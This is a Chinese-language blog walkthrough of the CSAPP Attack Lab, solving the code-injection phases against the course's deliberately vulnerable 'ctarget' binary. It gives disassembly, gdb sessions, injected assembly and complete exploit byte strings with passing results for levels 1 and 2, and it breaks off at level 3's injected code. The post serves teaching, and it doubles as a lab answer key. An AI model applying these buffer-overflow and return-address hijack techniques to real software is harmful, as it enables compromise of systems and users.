---
title: CSAPP - Attack Lab
date: 2024-07-05
tags:
- CSAPP
categories:
- Project
---

# 文件说明

`ctarget`: An executable program vulnerable to **code-injection**(CI) attacks.
`rtarget`: An executable program vulnerable to **return-oriented-programming**(ROP) attacks.
`cookie.txt`: An 8-digit hex code that you will use as a unique identifier in your attack
`farm.c`: 用来生成ROP攻击的代码。
`hex2raw`: 生成攻击字符串的工具。

输入`ctarget -h`查看帮助信息：

```shell
Usage: [-hq] ./ctarget -i <infile>
  -h          Print help information
  -q          Don't submit result to server
  -i <infile> Input file
```

我们在本地跑的话必须加上`-q`选项，否则会提示`Running on an illegal host`错误。

# 工具使用

## hex2raw

`hex2raw` 可以将文本中保存的ascii码值转化成字符串。注意每个ascii需要以空格分开，可以加注释(注释/* */前后需要空格)。

比如在`exploit.txt`中保存`30 31 32 33 34 35 /* 012345 */`，通过`cat exploit.txt | ./hex2raw/`，可以转换成字符串`012345`。输入`48 c7 c1 f0 11 40 00 /* mov $0x40011f0,%rcx */`就是一条指令。

因为ASCII键盘可输入的值只有从0x20~0x7e，所以我们没法通过键盘输入所有想要的字节，比如0x19。
这就要利用到`hex2raw`工具，可以把这些范围外的值输入给ctarget,比如`./hex2raw < exploit.txt | ./ctarget`

## 将汇编指令转化为字节流

在我们准备注入代码时，需要将要注入的指令转化为字节流。

准备好需要翻译的指令文件`example.s`，比如:

```txt
pushq $0xabcdef	# Push value onto stack
addq $17,%rax 	# Add 17 to %rax
movl %eax,%edx 	# Copy lower 32 bits to %edx
```

执行

```shell
gcc -c example.s
objdump -d example.o > example.d
```

## 实验讲解

具体参考讲义attacklab.pdf。

`CTARGET`和`RTARGET`都从标准输入读取字符串，形式如下：

```c
unsigned getbuf()
{
	char buf[BUFFER_SIZE];
	Gets(buf);
	return 1;
}
```

`Gets()`函数类似于标准库函数的`gets()`，从标准输入读取字符串直到遇到换行符`\n`或end-of-file。然后将该字符串加上一个终止符`\0`保存进传入的buffer。
如果传入的字符串大于buffer的大小，那么就会发生buffer overflow。

如果传入的字符串很短，那么显然`getbuf`会返回1，输入如下信息：

```shell
unix> ./ctarget

Cookie: 0x1a7dd803
Type string: Keep it short!
No exploit. Getbuf returned 0x1
Normal return
```

如果输入了一个长字符串，那么会报如下错误：

```shell
unix> ./ctarget
Cookie: 0x1a7dd803
Type string: This is not a very interesting string, but it has the property ...
Ouch!: You caused a segmentation fault!
Better luck next time
```

注意：

- 传入的字符串不要包含`0x0a`，对应的是`\n`换行符，`Gets()`会停止接受后面的字符串。
- `hex2raw`对应的字节都需要两个数字来表示，0需要是`00`，`0xdeadbeef`需要传入`ef be ad de`。注意小端序。

实验一共包含5个phases，三个CI攻击，两个ROP攻击。
![](https://xyc-1316422823.cos.ap-shanghai.myqcloud.com/20240718225041.png)

## 运行ctarget出现segement fault

然而在我的ubuntu22.04中，运行`./ctarget`，没有提示输入字符串而直接报错了。搜了下是ubuntu22.04的版本原因。

```shell
Cookie: 0x59b997fa
Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:0:
```

解决方法: https://blog.rijuyuezhu.top/posts/db646f34/
利用博主提供的`printf.so`代替glibc中的printf库。再执行`LD_PRELOAD=./printf.so ./ctarget -q`就成功解决了。

gdb调试首先将`phase1.txt`通过`hex2raw`翻译成ascii码`./hex2raw < phase1.txt > phase1-raw.txt`

`gdb ctarget`后需要输入:

```shell
(gdb) set environment LD_PRELOAD=./printf.so
(gdb) r -q < phase1-raw.txt

```

# 实验解答

## Code Injection Attacks

CI实验保证了两个前提:

1. 栈地址是固定的，不会采用栈随机化的方法。
2. 栈上的data是executable可执行的。

`CTARGET`中`test()`函数调用了`getbuf()`，如果`getbuf()`正常返回的话会执行下面一行打印语句。

```c
void test()
{
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

`getbuf()`函数前面已经提到过了，如下:

```c
unsigned getbuf()
{
	char buf[BUFFER_SIZE];
	Gets(buf);
	return 1;
}
```

### Level 1

phase1不会注入新的code，而是需要利用输入的字符串将程序重定向到执行另一块现有代码。

现在我们需要将`getbuf`函数重定向到`touch1()`而不是返回`test()`。

```c
 void touch1()
{
	vlevel = 1; /* Part of validation protocol */
	printf("Touch1!: You called touch1()\n");
	validate(1);
	exit(0);
}
```

首先需要将`ctarget`反汇编，`objdump -d ctarget > ctarget.txt`。

找到`touch`函数的地址为`0x4017c0`。

```txt
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	call   400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	call   401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	call   400e40 <exit@plt>
```

查看`getbuf`函数，可以看出分配了0x28的栈空间，因此数组大小`BUFFER_SIZE`为0x28。

```txt
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

再查看调用`getbuf`函数的`test`函数地址为`0x401968`，因此我们需要做的就是把该返回地址`0x401968`替换为`touch1`的地址`0x4017c0`。

![](https://xyc-1316422823.cos.ap-shanghai.myqcloud.com/20240719213815.png)

首先填充任意0x28个字节，最后8个字节为`c0 17 40 00 00 00 00 00`，就可以到达`touch1`。

exploit.txt中level 1的答案为：

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

```shell
$ ./hex2raw < phase1.txt | LD_PRELOAD=./printf.so ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00
```

### Level 2

phase2 需要注入一段攻击代码。

最终目标是跳转到`touch2`函数，并且控制传入`touch2`的参数`val`是我们的`cookie`值。

```c
void touch2(unsigned val)
{
	vlevel = 2; /* Part of validation protocol */

	if (val == cookie) {
		printf("Touch2!: You called touch2(0x%.8x)\n", val);
		validate(2);
	} else {
		printf("Misfire: You called touch2(0x%.8x)\n", val);
		fail(2);
	}
	exit(0);
}
```

如果利用level1的方法，只能修改return address跳转到touch2，而没有办法控制传入的参数，即修改`%rdi`的值。

因此我们需要在`getbuf`函数ret返回后，先跳转到我们的注入代码入口地址。然后在注入的代码配置好touch2的参数即寄存器`%rdi`的值，再利用ret跳转到`touch2`函数。

![](https://xyc-1316422823.cos.ap-shanghai.myqcloud.com/20240720081208.png)

需要利用gdb调试来一步一步观察程序如何运行。

```shell
./hex2raw < phase2.txt > phase2-raw.txt

gdb ctarget
(gdb) set environment LD_PRELOAD=./printf.so
(gdb) r -q < phase2-raw.txt
(gdb) b getbuf
(gdb) disassemble
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
=> 0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    ret
(gdb) info r
rsp            0x5561dc78          0x5561dc78
```

打印出%rsp的值，为`0x5561dc78`，是我们注入代码的地址入口。因此我们首先要覆盖第一次的返回地址，在buf的溢出区把返回test的地址`0x401968`修改为`0x5561dc78`。

这样`getbuf`第一次返回后跳转至栈上的代码开始运行。我们需要干的事情有：

```txt
# phase2_ass_code.s

movq $0x4017ec, (%rsp)
movq $0x59b997fa, %rdi
ret
```

1. 将此时的栈指针%rsp的值修改为touch2函数入口(在执行完getbuf后，%rsp指向图中return address)。
2. 修改%rdi的值为cookie值。
3. ret返回。即返回当前栈保存的地址。

```shell
gcc -c phase2_ass_code.s
objdump -d phase2_ass_code.o > phase2_ass_code.d
```

phase2_ass_code.d的内容为：

```txt
phase2_ass_code.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 04 24 ec 17 40 	movq   $0x4017ec,(%rsp)
   7:	00
   8:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   f:	c3                   	ret
```

将生成的字节流保存进phase2.txt，因此最后的答案为

```txt
48 c7 04 24 ec 17 40 00 /* movq   $0x4017ec,(%rsp) */
48 c7 c7 fa 97 b9 59 c3 /* mov    $0x59b997fa,%rdi;ret */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 /* change getbuf return address to injected code in stack*/
```

得到正确结果

```shell
./hex2raw < phase2.txt | LD_PRELOAD=./printf.so ./ctarget -q

Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 04 24 EC 17 40 00 48 C7 C7 FA 97 B9 59 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
```

### Level 3

level3 需要跳转到`touch3`, 并且传入一个字符串，调用`hexmatch`函数，检查该字符串值是否与cookie一致。

```c
 int hexmatch(unsigned val, char *sval)
{
	char cbuf[110];
	/* Make position of check string unpredictable */
	char *s = cbuf + random() % 100;
	sprintf(s, "%.8x", val);
	return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval)
{
	vlevel = 3; /* Part of validation protocol */
	if (hexmatch(cookie, sval)) {
		printf("Touch3!: You called touch3(\"%s\")\n", sval);
		validate(3);
	} else {
		printf("Misfire: You called touch3(\"%s\")\n", sval);
		fail(3);
	}
	exit(0);
}
```

思路和level2类似，需要先跳转到注入代码，将字符串存储在栈上，将字符串地址传入`%rdi`后调用`touch3`。
字符串的内容为"59b997fa", 对应的ascii码值为`0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61`

因此注入代码为：

```txt
movq $0x6166373939623935, %rax
pushq %rax 		# store string in stack
movq %rsp, %rdi
pushq $0x4018fa		# touch3 entry
ret
```

![](https://xyc-1316422823.cos.ap-shanghai.myqcloud.com/20240720100747.png)
